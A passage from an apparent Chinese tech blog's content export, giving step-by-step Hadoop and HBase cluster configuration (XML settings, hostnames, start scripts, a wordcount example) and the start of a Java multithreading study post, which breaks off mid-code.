href=\"#进入Hadoop官网找到最新的稳定版下载\" class=\"headerlink\" title=\"进入Hadoop官网找到最新的稳定版下载\"></a>进入<code>Hadoop</code>官网找到最新的稳定版下载</h3><p><img src=\"/images/hadoopdownloads.png\" alt=\"下载界面\"></p>\n<p><strong>下载完成后将压缩包解压并重命名为<code>hadoop</code>(为了方便)</strong></p>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><p><strong>编辑<code>hadoop/etc/hadoop/core-site.xml</code>,指定NameNode的主机名和端口</strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>fs.defaultFS<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hdfs://hadoop-master:9000<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>io.file.buffer.size<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>131072<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hadoop.tmp.dir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/tmp<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>需要说明属性<code>hadoop.tmp.dir</code>的值是一个你电脑上的目录，为了方便，最好将它设置在<code>hadoop</code>目录下。而<code>fs.defaultFS</code>的值是主机+端口,<code>hadoop-master</code>可以在<code>/etc/hosts</code>里面设置，一般本机设置默认为<code>localhost</code>，<code>fs.default.name</code>的值统一为<code>masters</code>下的主机名称.</p>\n</blockquote>\n<p><strong>编辑<code>hadoop/etc/hadoop/hdfs-site.xml</code>,指定HDFS的默认副本数</strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.namenode.name.dir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/hdfs/namenode<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.datanode.data.dir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/hdfs/datanode<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.namenode.checkpoint.dir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/hdfs/namesecondary<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.replication<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.block.size<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>134217728<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>编辑<code>hadoop/etc/hadoop/mapred-site.xml</code>,指定JobTracker的主机名和端口(如果没有，直接复制<code>mapred-site.xml.template</code>)</strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>mapreduce.framework.name<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>yarn<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>mapreduce.jobhistory.address<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master:10020<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master:19888<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--</span><br><span class=\"line\">\t&lt;property&gt;</span><br><span class=\"line\">\t\t&lt;name&gt;yarn.app.mapreduce.am.staging-dir&lt;/name&gt;</span><br><span class=\"line\">\t\t&lt;value&gt;file:/home/fenlan/Downloads/hadoop/app&lt;/value&gt;</span><br><span class=\"line\">\t&lt;/property&gt;</span><br><span class=\"line\">\t--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>编辑<code>hadoop/etc/hadoop/yarn-site.xml</code></strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- Site specific YARN configuration properties --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.resourcemanager.hostname<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--</span><br><span class=\"line\">\t&lt;property&gt;</span><br><span class=\"line\">\t\t&lt;name&gt;yarn.resourcemanager.bind-host&lt;/name&gt;</span><br><span class=\"line\">\t\t&lt;value&gt;0.0.0.0&lt;/value&gt;</span><br><span class=\"line\">\t&lt;/property&gt;</span><br><span class=\"line\">\t&lt;property&gt;</span><br><span class=\"line\">\t\t&lt;name&gt;yarn.nodemanager.bind-host&lt;/name&gt;</span><br><span class=\"line\">\t\t&lt;value&gt;0.0.0.0&lt;/value&gt;</span><br><span class=\"line\">\t&lt;/property&gt;</span><br><span class=\"line\">    --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.nodemanager.aux-services<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>mapreduce_shuffle<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.nodemanager.aux-services.mapreduce_shuffle.class<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>org.apache.hadoop.mapred.ShuffleHandler<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.log-aggregation-enable<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.nodemanager.local-dirs<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/yarn/local<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.nodemanager.log-dirs<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/yarn/log<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--</span><br><span class=\"line\">\t&lt;property&gt;</span><br><span class=\"line\">\t\t&lt;name&gt;yarn.nodemanager.remote-app-log-dir&lt;/name&gt;</span><br><span class=\"line\">\t\t&lt;value&gt;hdfs://hadoop-master:9000/home/fenlan/Downloads/hadoop/yarn-log/apps&lt;/value&gt;</span><br><span class=\"line\">\t&lt;/property&gt;</span><br><span class=\"line\">\t--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>修改<code>hadoop/etc/hadoop/hadoop-env.sh</code>,将里面的JAVA_HOME设置为JAVA安装根目录</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export HAVA_HOME＝/home/fenlan/Downloads/jdk1.8.0_60</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>想知道本机JAVA_HOME，敲个<code>which java</code>就知道了</p>\n</blockquote>\n<p><strong>编辑<code>hadoop/etc/hadoop/master</code>,添加namenode主机,<code>hadoop/etc/hadoop/slaves</code>,添加datanode主机</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hadoop-master</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hadoop-slave1</span><br><span class=\"line\">hadoop-slave2</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>需要说明，hadoop-slave hadoop-master为主机的hostname, 为了方便管理，需要将主机的hostname修改, 比如我的电脑开始hostname是<code>fenlan-K401UQ</code>, 在我的教程里面就需要改成<code>hadoop-slave1</code>(相当重要，否则在运行程序是会报错找不到主机),这里我个人感激仍然没有讲清楚，下面有一个youtube视频教程，辅助理解</p>\n</blockquote>\n<p><strong>格式化HDFS</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hdfs namenode -format</span><br></pre></td></tr></table></figure></p>\n<p><strong>启动Hadoop的单节点集群</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sbin/start-dfs.sh</span><br><span class=\"line\">sbin/start-yarn.sh</span><br><span class=\"line\">sbin/mr-jobhistory-daemon.sh start historyserver</span><br><span class=\"line\">sbin/start-all.sh</span><br></pre></td></tr></table></figure></p>\n<p><strong>停止Hadoop</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sbin/stop-dfs.sh</span><br><span class=\"line\">sbin/stop-yarn.sh</span><br><span class=\"line\">sbin/mr-jobhistory-daemon.sh stop historyserver</span><br><span class=\"line\">sbin/stop-all.sh</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"加载HDFS\"><a href=\"#加载HDFS\" class=\"headerlink\" title=\"加载HDFS\"></a>加载HDFS</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hadoop fs -mkdir /fenlan/input</span><br><span class=\"line\">bin/hadoop fs -mkdir /fenlan/output</span><br><span class=\"line\">bin/hadoop fs -put files /fenlan/input</span><br></pre></td></tr></table></figure>\n<p><strong>运行一个单词统计实例</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-2.8.1.jar wordcount /fenlan/input /fenlan/output/result</span><br></pre></td></tr></table></figure></p>\n<p><strong>查看结果</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hadoop fs -cat /fenlan/output/result/*</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"推荐教程\"><a href=\"#推荐教程\" class=\"headerlink\" title=\"推荐教程\"></a>推荐教程</h2><p><a href=\"https://dwbi.org/etl/bigdata/183-setup-hadoop-cluster\">hadoop搭建教程</a><br><a href=\"http://www.ityouknow.com/hadoop/2017/07/24/hadoop-cluster-setup.html\">hadoop分布式集群搭建</a><br><a href=\"https://www.youtube.com/watch?v=-YEcJquYsFo\">视频教程(youtube)</a></p>\n<h2 id=\"HBase-安装\"><a href=\"#HBase-安装\" class=\"headerlink\" title=\"HBase 安装\"></a>HBase 安装</h2><ol>\n<li>官网下载HBase,解压包并重命名为<code>hbase</code></li>\n<li>编辑<code>hbase/conf/hbase-env.sh</code>的<code>JAVA_HOME</code></li>\n<li><p>编辑<code>hbase/conf/hbase-site.xml</code>如下</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.rootdir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hdfs://hadoop-master:9000/hbase<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.cluster.distributed<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.master<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master:60000<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.zookeeper.quorum<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master,hadoop-slave1,hadoop-slave2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.master.info.port<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>60010<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.master.port<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>60000<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编辑<code>hbase/conf/regionservers</code>添加slaves主机</p>\n</li>\n<li><p>启动HBase(先启动hadoop)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/start-hbase.sh</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>管理HBase</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hbase shell</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"问题总结\"><a href=\"#问题总结\" class=\"headerlink\" title=\"问题总结\"></a>问题总结</h2><p><strong>1.当无法启动datanode时将<code>hadoop/hdfs/datanode/current/</code>文件夹删掉重新启动</strong></p>\n<p><strong>教程如果有错误，欢迎留言!</strong></p>"},{"title":"java线程学习记录","date":"2016-06-18T07:18:23.000Z","_content":"\n**在接触Android时候发现java基础没打好，所以回来重新打基础**\n\n### java线程基础\n\n<!--more-->\n\n**java线程是在一个程序代码中CPU同步运行多个程序片段，而不是一行代码一行代码地执行到底，这样做是为了在运行大程序时提高程序的运行效率。虽然说的是同步运行，其实是“微观串行，宏观并行”，只是线程之间的切换时间太短以至于我们看上去是并行的。另外线程的调度模式有    （1）分时模型   （2）抢占模型**\n**java用的是抢占模型，其他知识以后再补充，现在放代码**\n\n> 重要提示：以下的代码的运行结果可能并不能代表多线程真正的运行顺序，因为本身线程运行时输出信号到显示器这段时间也是不可预计的，所以显示器上的显示顺序不完全代表运行代码时间先后。这个问题叫做`显示调度器不可预测`\n\n**1. 继承`Thread`类，重写`run`函数**\n``` java\n\nclass ThreadTest {\n\tpublic static void main (String[] args){\n\t\tMyThread thread1 = new MyThread(\"thread1\");\n\t\tMyThread thread2 = new MyThread(\"thread2\");\n\t\tthread1.start();\n\t\tthread2.start();\n\t\tSystem.out.println(\"The main runnnig is stopped\");\n\t}\n}\n\nclass MyThread extends Thread {\n\tpublic MyThread(String str){\n\t\tsuper(str);\n\t}\n\tpublic void run(){\n\t\tfor (int i=0;i<3;i++){\n\t\t\tSystem.out.println(getName() + \"is running\");\n\t\t\ttry {\n\t\t\t\tsleep(100);\n\t\t\t} catch (InterruptedException e) {}\n\t\t}\n\t\tSystem.out.println(getName() + \"stopped\");\n\t}\n}\n\n```\n\n**运行结果如下**\n``` bash\nThe main runnnig is stopped\nthread2is running\nthread1is running\nthread1is running\nthread2is running\nthread1is running\nthread2is running\nthread2stopped\nthread1stopped\n```\n\n**2. 实现`Runable`接口**\n\n``` java\nclass TestSync implements Runnable {\n\n    private int balance;\n\n    @Override\n    public void run() {\n        for(int i = 0; i < 50; i++) {\n            increament();\n            System.out.println(\"balance is \" + balance);\n        }\n    }\n\n    private void increament() {\n        int i = balance;\n        balance = i + 1;\n    }\n}\n\npublic class TestSyncTest {\n\n    public static void main(String[] args) {\n        TestSync job = new TestSync();\n        Thread a = new Thread(job);\n        Thread b = new Thread(job);\n        a.start();\n        b.start();\n    }\n}\n```\n\n### 线程调度函数及代码实例\n- `sleep(long millis)` : 在指定的毫秒数内让当前正在执行的线程休眠（暂停执行）\n- `join()` : 在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。\n\n``` java\nclass MyThread extends Thread {\n    public MyThread(String name) {\n        super(name);\n    }\n\n    public void run() {\n        int result = 0;\n        